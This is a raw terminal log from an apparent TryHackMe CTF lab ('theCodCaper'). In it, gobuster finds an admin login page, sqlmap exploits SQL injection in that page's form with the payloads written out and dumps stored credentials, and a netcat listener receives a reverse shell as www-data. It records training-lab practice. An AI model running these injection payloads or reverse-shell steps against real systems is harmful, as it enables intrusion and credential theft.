18721 / 20476 (91.43%)Progress: 18762 / 20476 (91.63%)Progress: 18805 / 20476 (91.84%)Progress: 18847 / 20476 (92.04%)Progress: 18889 / 20476 (92.25%)Progress: 18934 / 20476 (92.47%)Progress: 18966 / 20476 (92.63%)Progress: 19009 / 20476 (92.84%)Progress: 19047 / 20476 (93.02%)Progress: 19089 / 20476 (93.23%)Progress: 19130 / 20476 (93.43%)Progress: 19168 / 20476 (93.61%)Progress: 19208 / 20476 (93.81%)Progress: 19259 / 20476 (94.06%)Progress: 19305 / 20476 (94.28%)Progress: 19348 / 20476 (94.49%)Progress: 19395 / 20476 (94.72%)Progress: 19438 / 20476 (94.93%)Progress: 19482 / 20476 (95.15%)Progress: 19526 / 20476 (95.36%)Progress: 19568 / 20476 (95.57%)Progress: 19603 / 20476 (95.74%)Progress: 19636 / 20476 (95.90%)Progress: 19677 / 20476 (96.10%)Progress: 19718 / 20476 (96.30%)Progress: 19750 / 20476 (96.45%)Progress: 19794 / 20476 (96.67%)Progress: 19837 / 20476 (96.88%)Progress: 19880 / 20476 (97.09%)Progress: 19923 / 20476 (97.30%)Progress: 19968 / 20476 (97.52%)Progress: 20012 / 20476 (97.73%)Progress: 20055 / 20476 (97.94%)Progress: 20099 / 20476 (98.16%)Progress: 20140 / 20476 (98.36%)Progress: 20183 / 20476 (98.57%)Progress: 20222 / 20476 (98.76%)Progress: 20265 / 20476 (98.97%)Progress: 20300 / 20476 (99.14%)Progress: 20335 / 20476 (99.31%)Progress: 20380 / 20476 (99.53%)Progress: 20414 / 20476 (99.70%)Progress: 20447 / 20476 (99.86%)[2K=====================================================
+2021/04/03 20:12:05 Finished
+=====================================================
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ gobuster -u 10.10.86.202 -w /usr/share/wordlists/big.txt [17@x php,txt,html  -[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.86.202/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/big.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Extensions   : txt,html,php
+[+] Timeout      : 10s
+=====================================================
+2021/04/03 20:13:48 Starting gobuster
+=====================================================
+Progress: 10 / 20476 (0.05%)Progress: 19 / 20476 (0.09%)[2K/.htpasswd (Status: 403)
+[2K/.htpasswd.txt (Status: 403)
+[2K/.htpasswd.html (Status: 403)
+[2K/.htpasswd.php (Status: 403)
+[2K/.htaccess (Status: 403)
+[2K/.htaccess.php (Status: 403)
+[2K/.htaccess.txt (Status: 403)
+[2K/.htaccess.html (Status: 403)
+Progress: 30 / 20476 (0.15%)Progress: 40 / 20476 (0.20%)Progress: 54 / 20476 (0.26%)Progress: 65 / 20476 (0.32%)Progress: 78 / 20476 (0.38%)Progress: 89 / 20476 (0.43%)Progress: 100 / 20476 (0.49%)Progress: 109 / 20476 (0.53%)Progress: 119 / 20476 (0.58%)Progress: 130 / 20476 (0.63%)Progress: 142 / 20476 (0.69%)Progress: 152 / 20476 (0.74%)Progress: 163 / 20476 (0.80%)Progress: 174 / 20476 (0.85%)Progress: 184 / 20476 (0.90%)Progress: 196 / 20476 (0.96%)Progress: 206 / 20476 (1.01%)Progress: 218 / 20476 (1.06%)Progress: 230 / 20476 (1.12%)Progress: 241 / 20476 (1.18%)Progress: 252 / 20476 (1.23%)Progress: 265 / 20476 (1.29%)Progress: 276 / 20476 (1.35%)Progress: 287 / 20476 (1.40%)Progress: 296 / 20476 (1.45%)Progress: 308 / 20476 (1.50%)Progress: 322 / 20476 (1.57%)Progress: 333 / 20476 (1.63%)Progress: 343 / 20476 (1.68%)Progress: 354 / 20476 (1.73%)Progress: 366 / 20476 (1.79%)Progress: 379 / 20476 (1.85%)Progress: 390 / 20476 (1.90%)Progress: 400 / 20476 (1.95%)Progress: 412 / 20476 (2.01%)Progress: 422 / 20476 (2.06%)Progress: 434 / 20476 (2.12%)Progress: 446 / 20476 (2.18%)Progress: 459 / 20476 (2.24%)Progress: 470 / 20476 (2.30%)Progress: 483 / 20476 (2.36%)Progress: 492 / 20476 (2.40%)Progress: 503 / 20476 (2.46%)Progress: 515 / 20476 (2.52%)Progress: 528 / 20476 (2.58%)Progress: 536 / 20476 (2.62%)Progress: 550 / 20476 (2.69%)Progress: 561 / 20476 (2.74%)Progress: 570 / 20476 (2.78%)Progress: 581 / 20476 (2.84%)Progress: 593 / 20476 (2.90%)Progress: 606 / 20476 (2.96%)Progress: 618 / 20476 (3.02%)Progress: 627 / 20476 (3.06%)Progress: 635 / 20476 (3.10%)Progress: 648 / 20476 (3.16%)Progress: 658 / 20476 (3.21%)Progress: 670 / 20476 (3.27%)Progress: 683 / 20476 (3.34%)Progress: 694 / 20476 (3.39%)Progress: 706 / 20476 (3.45%)Progress: 718 / 20476 (3.51%)Progress: 730 / 20476 (3.57%)Progress: 741 / 20476 (3.62%)Progress: 753 / 20476 (3.68%)Progress: 764 / 20476 (3.73%)Progress: 777 / 20476 (3.79%)Progress: 786 / 20476 (3.84%)Progress: 798 / 20476 (3.90%)Progress: 811 / 20476 (3.96%)Progress: 821 / 20476 (4.01%)Progress: 831 / 20476 (4.06%)Progress: 841 / 20476 (4.11%)Progress: 850 / 20476 (4.15%)Progress: 860 / 20476 (4.20%)Progress: 872 / 20476 (4.26%)Progress: 884 / 20476 (4.32%)Progress: 893 / 20476 (4.36%)Progress: 905 / 20476 (4.42%)Progress: 918 / 20476 (4.48%)Progress: 929 / 20476 (4.54%)Progress: 940 / 20476 (4.59%)Progress: 952 / 20476 (4.65%)Progress: 965 / 20476 (4.71%)Progress: 975 / 20476 (4.76%)Progress: 988 / 20476 (4.83%)Progress: 999 / 20476 (4.88%)Progress: 1010 / 20476 (4.93%)Progress: 1021 / 20476 (4.99%)Progress: 1030 / 20476 (5.03%)Progress: 1040 / 20476 (5.08%)Progress: 1051 / 20476 (5.13%)Progress: 1060 / 20476 (5.18%)Progress: 1073 / 20476 (5.24%)Progress: 1082 / 20476 (5.28%)Progress: 1094 / 20476 (5.34%)Progress: 1107 / 20476 (5.41%)Progress: 1118 / 20476 (5.46%)Progress: 1128 / 20476 (5.51%)Progress: 1138 / 20476 (5.56%)Progress: 1149 / 20476 (5.61%)Progress: 1159 / 20476 (5.66%)Progress: 1170 / 20476 (5.71%)Progress: 1182 / 20476 (5.77%)Progress: 1193 / 20476 (5.83%)Progress: 1207 / 20476 (5.89%)Progress: 1218 / 20476 (5.95%)Progress: 1232 / 20476 (6.02%)Progress: 1241 / 20476 (6.06%)Progress: 1249 / 20476 (6.10%)Progress: 1260 / 20476 (6.15%)Progress: 1269 / 20476 (6.20%)Progress: 1281 / 20476 (6.26%)Progress: 1291 / 20476 (6.30%)Progress: 1301 / 20476 (6.35%)Progress: 1311 / 20476 (6.40%)Progress: 1324 / 20476 (6.47%)Progress: 1336 / 20476 (6.52%)Progress: 1345 / 20476 (6.57%)Progress: 1354 / 20476 (6.61%)Progress: 1366 / 20476 (6.67%)Progress: 1379 / 20476 (6.73%)Progress: 1389 / 20476 (6.78%)Progress: 1400 / 20476 (6.84%)Progress: 1411 / 20476 (6.89%)Progress: 1423 / 20476 (6.95%)Progress: 1432 / 20476 (6.99%)Progress: 1442 / 20476 (7.04%)Progress: 1455 / 20476 (7.11%)Progress: 1464 / 20476 (7.15%)Progress: 1478 / 20476 (7.22%)Progress: 1488 / 20476 (7.27%)Progress: 1500 / 20476 (7.33%)Progress: 1512 / 20476 (7.38%)Progress: 1523 / 20476 (7.44%)Progress: 1532 / 20476 (7.48%)Progress: 1544 / 20476 (7.54%)Progress: 1553 / 20476 (7.58%)Progress: 1565 / 20476 (7.64%)Progress: 1576 / 20476 (7.70%)Progress: 1586 / 20476 (7.75%)Progress: 1596 / 20476 (7.79%)Progress: 1608 / 20476 (7.85%)Progress: 1621 / 20476 (7.92%)Progress: 1630 / 20476 (7.96%)Progress: 1643 / 20476 (8.02%)Progress: 1652 / 20476 (8.07%)Progress: 1661 / 20476 (8.11%)Progress: 1671 / 20476 (8.16%)Progress: 1682 / 20476 (8.21%)Progress: 1693 / 20476 (8.27%)Progress: 1707 / 20476 (8.34%)Progress: 1714 / 20476 (8.37%)Progress: 1727 / 20476 (8.43%)Progress: 1738 / 20476 (8.49%)Progress: 1750 / 20476 (8.55%)Progress: 1762 / 20476 (8.61%)Progress: 1774 / 20476 (8.66%)Progress: 1787 / 20476 (8.73%)Progress: 1798 / 20476 (8.78%)Progress: 1809 / 20476 (8.83%)Progress: 1822 / 20476 (8.90%)Progress: 1833 / 20476 (8.95%)Progress: 1844 / 20476 (9.01%)Progress: 1854 / 20476 (9.05%)Progress: 1863 / 20476 (9.10%)Progress: 1875 / 20476 (9.16%)Progress: 1886 / 20476 (9.21%)Progress: 1897 / 20476 (9.26%)Progress: 1906 / 20476 (9.31%)[2K/administrator.php (Status: 200)
+Progress: 1921 / 20476 (9.38%)Progress: 1931 / 20476 (9.43%)Progress: 1942 / 20476 (9.48%)Progress: 1951 / 20476 (9.53%)Progress: 1962 / 20476 (9.58%)Progress: 1973 / 20476 (9.64%)Progress: 1984 / 20476 (9.69%)Progress: 1996 / 20476 (9.75%)Progress: 2005 / 20476 (9.79%)Progress: 2015 / 20476 (9.84%)Progress: 2024 / 20476 (9.88%)Progress: 2037 / 20476 (9.95%)Progress: 2049 / 20476 (10.01%)Progress: 2062 / 20476 (10.07%)Progress: 2072 / 20476 (10.12%)Progress: 2082 / 20476 (10.17%)Progress: 2093 / 20476 (10.22%)Progress: 2104 / 20476 (10.28%)Progress: 2114 / 20476 (10.32%)Progress: 2126 / 20476 (10.38%)Progress: 2139 / 20476 (10.45%)Progress: 2151 / 20476 (10.50%)Progress: 2161 / 20476 (10.55%)Progress: 2173 / 20476 (10.61%)Progress: 2189 / 20476 (10.69%)Progress: 2201 / 20476 (10.75%)Progress: 2217 / 20476 (10.83%)Progress: 2227 / 20476 (10.88%)Progress: 2238 / 20476 (10.93%)Progress: 2249 / 20476 (10.98%)Progress: 2259 / 20476 (11.03%)Progress: 2272 / 20476 (11.10%)Progress: 2284 / 20476 (11.15%)Progress: 2293 / 20476 (11.20%)Progress: 2307 / 20476 (11.27%)Progress: 2319 / 20476 (11.33%)Progress: 2330 / 20476 (11.38%)Progress: 2343 / 20476 (11.44%)Progress: 2353 / 20476 (11.49%)Progress: 2366 / 20476 (11.55%)Progress: 2374 / 20476 (11.59%)Progress: 2388 / 20476 (11.66%)Progress: 2403 / 20476 (11.74%)Progress: 2409 / 20476 (11.76%)Progress: 2422 / 20476 (11.83%)Progress: 2441 / 20476 (11.92%)Progress: 2451 / 20476 (11.97%)Progress: 2462 / 20476 (12.02%)Progress: 2477 / 20476 (12.10%)Progress: 2489 / 20476 (12.16%)Progress: 2499 / 20476 (12.20%)Progress: 2509 / 20476 (12.25%)Progress: 2520 / 20476 (12.31%)Progress: 2529 / 20476 (12.35%)Progress: 2543 / 20476 (12.42%)Progress: 2556 / 20476 (12.48%)Progress: 2566 / 20476 (12.53%)Progress: 2578 / 20476 (12.59%)Progress: 2590 / 20476 (12.65%)Progress: 2603 / 20476 (12.71%)Progress: 2616 / 20476 (12.78%)Progress: 2627 / 20476 (12.83%)Progress: 2637 / 20476 (12.88%)Progress: 2648 / 20476 (12.93%)Progress: 2658 / 20476 (12.98%)Progress: 2671 / 20476 (13.04%)Progress: 2683 / 20476 (13.10%)Progress: 2693 / 20476 (13.15%)Progress: 2704 / 20476 (13.21%)Progress: 2716 / 20476 (13.26%)Progress: 2728 / 20476 (13.32%)Progress: 2739 / 20476 (13.38%)Progress: 2752 / 20476 (13.44%)Progress: 2764 / 20476 (13.50%)Progress: 2774 / 20476 (13.55%)Progress: 2785 / 20476 (13.60%)Progress: 2796 / 20476 (13.66%)Progress: 2808 / 20476 (13.71%)Progress: 2819 / 20476 (13.77%)Progress: 2828 / 20476 (13.81%)Progress: 2841 / 20476 (13.87%)Progress: 2850 / 20476 (13.92%)Progress: 2863 / 20476 (13.98%)Progress: 2875 / 20476 (14.04%)Progress: 2886 / 20476 (14.09%)Progress: 2897 / 20476 (14.15%)Progress: 2911 / 20476 (14.22%)Progress: 2921 / 20476 (14.27%)Progress: 2933 / 20476 (14.32%)Progress: 2941 / 20476 (14.36%)Progress: 2954 / 20476 (14.43%)Progress: 2964 / 20476 (14.48%)Progress: 2975 / 20476 (14.53%)Progress: 2985 / 20476 (14.58%)Progress: 2997 / 20476 (14.64%)Progress: 3009 / 20476 (14.70%)Progress: 3022 / 20476 (14.76%)Progress: 3030 / 20476 (14.80%)Progress: 3047 / 20476 (14.88%)Progress: 3055 / 20476 (14.92%)Progress: 3065 / 20476 (14.97%)Progress: 3078 / 20476 (15.03%)Progress: 3087 / 20476 (15.08%)Progress: 3098 / 20476 (15.13%)Progress: 3113 / 20476 (15.20%)Progress: 3123 / 20476 (15.25%)Progress: 3132 / 20476 (15.30%)Progress: 3145 / 20476 (15.36%)Progress: 3157 / 20476 (15.42%)Progress: 3167 / 20476 (15.47%)Progress: 3177 / 20476 (15.52%)Progress: 3188 / 20476 (15.57%)Progress: 3199 / 20476 (15.62%)Progress: 3208 / 20476 (15.67%)Progress: 3222 / 20476 (15.74%)Progress: 3231 / 20476 (15.78%)Progress: 3242 / 20476 (15.83%)Progress: 3256 / 20476 (15.90%)Progress: 3266 / 20476 (15.95%)Progress: 3273 / 20476 (15.98%)Progress: 3283 / 20476 (16.03%)Progress: 3295 / 20476 (16.09%)Progress: 3308 / 20476 (16.16%)Progress: 3317 / 20476 (16.20%)Progress: 3323 / 20476 (16.23%)Progress: 3335 / 20476 (16.29%)Progress: 3344 / 20476 (16.33%)Progress: 3359 / 20476 (16.40%)Progress: 3374 / 20476 (16.48%)Progress: 3389 / 20476 (16.55%)Progress: 3401 / 20476 (16.61%)Progress: 3409 / 20476 (16.65%)Progress: 3420 / 20476 (16.70%)Progress: 3433 / 20476 (16.77%)Progress: 3442 / 20476 (16.81%)Progress: 3456 / 20476 (16.88%)Progress: 3460 / 20476 (16.90%)Progress: 3477 / 20476 (16.98%)Progress: 3491 / 20476 (17.05%)Progress: 3509 / 20476 (17.14%)Progress: 3520 / 20476 (17.19%)Progress: 3530 / 20476 (17.24%)Progress: 3547 / 20476 (17.32%)Progress: 3559 / 20476 (17.38%)Progress: 3569 / 20476 (17.43%)Progress: 3580 / 20476 (17.48%)Progress: 3592 / 20476 (17.54%)Progress: 3605 / 20476 (17.61%)Progress: 3616 / 20476 (17.66%)Progress: 3625 / 20476 (17.70%)Progress: 3634 / 20476 (17.75%)Progress: 3648 / 20476 (17.82%)Progress: 3661 / 20476 (17.88%)Progress: 3671 / 20476 (17.93%)Progress: 3681 / 20476 (17.98%)Progress: 3691 / 20476 (18.03%)Progress: 3701 / 20476 (18.07%)Progress: 3711 / 20476 (18.12%)Progress: 3722 / 20476 (18.18%)Progress: 3737 / 20476 (18.25%)Progress: 3749 / 20476 (18.31%)Progress: 3759 / 20476 (18.36%)Progress: 3770 / 20476 (18.41%)Progress: 3783 / 20476 (18.48%)Progress: 3791 / 20476 (18.51%)Progress: 3803 / 20476 (18.57%)Progress: 3813 / 20476 (18.62%)Progress: 3825 / 20476 (18.68%)Progress: 3837 / 20476 (18.74%)Progress: 3847 / 20476 (18.79%)Progress: 3857 / 20476 (18.84%)Progress: 3870 / 20476 (18.90%)Progress: 3880 / 20476 (18.95%)Progress: 3894 / 20476 (19.02%)Progress: 3905 / 20476 (19.07%)Progress: 3916 / 20476 (19.12%)Progress: 3929 / 20476 (19.19%)Progress: 3941 / 20476 (19.25%)Progress: 3951 / 20476 (19.30%)Progress: 3962 / 20476 (19.35%)Progress: 3972 / 20476 (19.40%)Progress: 3983 / 20476 (19.45%)Progress: 3994 / 20476 (19.51%)Progress: 4003 / 20476 (19.55%)Progress: 4018 / 20476 (19.62%)Progress: 4029 / 20476 (19.68%)Progress: 4041 / 20476 (19.74%)Progress: 4050 / 20476 (19.78%)Progress: 4061 / 20476 (19.83%)Progress: 4073 / 20476 (19.89%)Progress: 4085 / 20476 (19.95%)Progress: 4094 / 20476 (19.99%)Progress: 4104 / 20476 (20.04%)Progress: 4116 / 20476 (20.10%)Progress: 4129 / 20476 (20.17%)Progress: 4138 / 20476 (20.21%)Progress: 4149 / 20476 (20.26%)Progress: 4161 / 20476 (20.32%)Progress: 4173 / 20476 (20.38%)Progress: 4187 / 20476 (20.45%)Progress: 4197 / 20476 (20.50%)Progress: 4209 / 20476 (20.56%)Progress: 4219 / 20476 (20.60%)Progress: 4230 / 20476 (20.66%)Progress: 4240 / 20476 (20.71%)Progress: 4251 / 20476 (20.76%)Progress: 4266 / 20476 (20.83%)Progress: 4279 / 20476 (20.90%)Progress: 4289 / 20476 (20.95%)Progress: 4299 / 20476 (21.00%)Progress: 4309 / 20476 (21.04%)Progress: 4319 / 20476 (21.09%)Progress: 4334 / 20476 (21.17%)Progress: 4342 / 20476 (21.21%)Progress: 4355 / 20476 (21.27%)Progress: 4368 / 20476 (21.33%)Progress: 4379 / 20476 (21.39%)Progress: 4389 / 20476 (21.43%)Progress: 4399 / 20476 (21.48%)Progress: 4414 / 20476 (21.56%)Progress: 4426 / 20476 (21.62%)Progress: 4433 / 20476 (21.65%)Progress: 4445 / 20476 (21.71%)Progress: 4455 / 20476 (21.76%)^C
+[!] Keyboard interrupt detected, terminating.
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/charter.html: context canceled
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/charts.php: context canceled
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/charting.html: context canceled
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/chat.php: context canceled
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/chatorg: context canceled
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/chatbox: context canceled
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/chase.php: context canceled
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/charts_library.txt: context canceled
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/chat1: context canceled
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/chat2: context canceled
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/chatroom: context canceled
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/chats: context canceled
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/chatrooms: context canceled
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/chatter: context canceled
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/chattest: context canceled
+[2K2021/04/03 20:20:25 [!] Get http://10.10.86.202/chcounter: context canceled
+[2K=====================================================
+2021/04/03 20:20:25 Finished
+=====================================================
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ sqlmap -u 10.10.86.202/administrator.php --forms --dump
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m([01;49m]_____ ___ ___  [01;37m{[01;90m1.4.4#stable[01;37m}[01;33m
+|_ -| . [[01;41m"[01;49m]     | .'| . |
+|___|_  [[01;41m)[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:01:10 /2021-04-03/
+
+[[36m21:01:10[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[[36m21:01:10[0m] [[32mINFO[0m] searching for forms
+[1m[#1] form:
+POST http://10.10.86.202/administrator.php
+POST data: username=&password=
+do you want to test this form? [Y/n/q] 
+> [0my
+[1mEdit POST data [default: username=&password=] (Warning: blank fields detected): [0m
+[1mdo you want to fill blank fields with random values? [Y/n] [0my
+[[36m21:01:19[0m] [[32mINFO[0m] resuming back-end DBMS '[37mmysql[0m' 
+[[36m21:01:19[0m] [[32mINFO[0m] using '[37m/home/supitha/.sqlmap/output/results-04032021_0901pm.csv[0m' as the CSV results file in multiple targets mode
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=NDUE' RLIKE (SELECT (CASE WHEN (9520=9520) THEN 0x4e445545 ELSE 0x28 END))-- UzLa&password=
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=NDUE' OR (SELECT 8419 FROM(SELECT COUNT(*),CONCAT(0x7176717171,(SELECT (ELT(8419=8419,1))),0x71787a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jFRn&password=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=NDUE' AND (SELECT 2240 FROM (SELECT(SLEEP(5)))TMCt)-- Psml&password=
+---
+[1mdo you want to exploit this SQL injection? [Y/n] [0my
+[[36m21:01:25[0m][1m [[32;1mINFO[0m][1m the back-end DBMS is MySQL[0m
+back-end DBMS: MySQL >= 5.0
+[[36m21:01:25[0m] [[33mWARNING[0m] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[[36m21:01:25[0m] [[32mINFO[0m] fetching current database
+[[36m21:01:25[0m] [[32mINFO[0m] resumed: '[37musers[0m'
+[[36m21:01:25[0m] [[32mINFO[0m] fetching tables for database: '[37musers[0m'
+[[36m21:01:25[0m] [[32mINFO[0m] resumed: '[37musers[0m'
+[[36m21:01:26[0m] [[32mINFO[0m] fetching columns for table '[37musers[0m' in database '[37musers[0m'
+[[36m21:01:25[0m] [[32mINFO[0m] resumed: '[37musername[0m'
+[[36m21:01:25[0m] [[32mINFO[0m] resumed: '[37mvarchar(100)[0m'
+[[36m21:01:25[0m] [[32mINFO[0m] resumed: '[37mpassword[0m'
+[[36m21:01:25[0m] [[32mINFO[0m] resumed: '[37mvarchar(100)[0m'
+[[36m21:01:26[0m] [[32mINFO[0m] fetching entries for table '[37musers[0m' in database '[37musers[0m'
+[[36m21:01:25[0m] [[32mINFO[0m] resumed: '[37msecretpass[0m'
+[[36m21:01:25[0m] [[32mINFO[0m] resumed: '[37mpingudad[0m'
+Database: users
+Table: users
+[1 entry]
++----------+------------+
+| username | password   |
++----------+------------+
+| pingudad | secretpass |
++----------+------------+
+
+[[36m21:01:26[0m] [[32mINFO[0m] table '[37musers.users[0m' dumped to CSV file '[37m/home/supitha/.sqlmap/output/10.10.86.202/dump/users/users.csv[0m'
+[[36m21:01:26[0m] [[32mINFO[0m] you can find results of scanning in multiple targets mode inside the CSV file '[37m/home/supitha/.sqlmap/output/results-04032021_0901pm.csv[0m'
+[[36m21:01:26[0m][1m [[33;1mWARNING[0m][1m you haven't updated sqlmap for more than 365 days!!![0m
+
+[*] ending @ 21:01:26 /2021-04-03/
+
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ sqlmap -u 10.10.86.202/administrator.php --forms --dump[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kh
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m"[01;49m]_____ ___ ___  [01;37m{[01;90m1.4.4#stable[01;37m}[01;33m
+|_ -| . [[01;41m)[01;49m]     | .'| . |
+|___|_  [[01;41m.[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+Usage: python3 sqlmap [options]
+
+Options:
+  -h, --help            Show basic help message and exit
+  -hh                   Show advanced help message and exit
+  --version             Show program's version number and exit
+  -v VERBOSE            Verbosity level: 0-6 (default 1)
+
+  Target:
+    At least one of these options has to be provided to define the
+    target(s)
+
+    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
+    -g GOOGLEDORK       Process Google dork results as target URLs
+
+  Request:
+    These options can be used to specify how to connect to the target URL
+
+    --data=DATA         Data string to be sent through POST (e.g. "id=1")
+    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
+    --random-agent      Use randomly selected HTTP User-Agent header value
+    --proxy=PROXY       Use a proxy to connect to the target URL
+    --tor               Use Tor anonymity network
+    --check-tor         Check to see if Tor is used properly
+
+  Injection:
+    These options can be used to specify which parameters to test for,
+    provide custom injection payloads and optional tampering scripts
+
+    -p TESTPARAMETER    Testable parameter(s)
+    --dbms=DBMS         Force back-end DBMS to provided value
+
+  Detection:
+    These options can be used to customize the detection phase
+
+    --level=LEVEL       Level of tests to perform (1-5, default 1)
+    --risk=RISK         Risk of tests to perform (1-3, default 1)
+
+  Techniques:
+    These options can be used to tweak testing of specific SQL injection
+    techniques
+
+    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
+
+  Enumeration:
+    These options can be used to enumerate the back-end database
+    management system information, structure and data contained in the
+    tables
+
+    -a, --all           Retrieve everything
+    -b, --banner        Retrieve DBMS banner
+    --current-user      Retrieve DBMS current user
+    --current-db        Retrieve DBMS current database
+    --passwords         Enumerate DBMS users password hashes
+    --tables            Enumerate DBMS database tables
+    --columns           Enumerate DBMS database table columns
+    --schema            Enumerate DBMS schema
+    --dump              Dump DBMS database table entries
+    --dump-all          Dump all DBMS databases tables entries
+    -D DB               DBMS database to enumerate
+    -T TBL              DBMS database table(s) to enumerate
+    -C COL              DBMS database table column(s) to enumerate
+
+  Operating system access:
+    These options can be used to access the back-end database management
+    system underlying operating system
+
+    --os-shell          Prompt for an interactive operating system shell
+    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
+
+  General:
+    These options can be used to set some general working parameters
+
+    --batch             Never ask for user input, use the default behavior
+    --flush-session     Flush session files for current target
+
+  Miscellaneous:
+    These options do not fit into any other category
+
+    --sqlmap-shell      Prompt for an interactive sqlmap shell
+    --wizard            Simple wizard interface for beginner users
+
+[!] to see full list of options run with '[37m-hh[0m'
+[[36m21:04:25[0m] [[33mWARNING[0m] you haven't updated sqlmap for more than 365 days!!!
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_theCodCaper[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_theCodCaper[00m$ sqlmap -hu 10.10.86.202/administrator.php --forms --dump[K[K[K[K[K[K[K[K[K[K[K[K[K[K--s[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kgobuster -x php,txt,html  -u 10.10.86.202 -w /usr/share/wordlists/big.txt [17P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[17@x php,txt,html  -[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ksqlmap -h[Ksqlmap -h[Kgobuster -x php,txt,html  -u 10.10.86.202 -w /usr/share/wordlists/big.txt [17P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[17@x php,txt,html  -[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[43Pnmap -sC -sV -p 22 10.10.86.20280[C[C[C[C[C[C[C[C[C[C[C[C[C[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Ksqlmap -u 10.10.86.202/administrator.php --forms --dump --[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Knc -lvnp 9999
+Listening on 0.0.0.0 9999
+Connection received on 10.10.86.202 45072
+bash: cannot set terminal process group (703): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ubuntu:/var/www/html$ ls
+ls
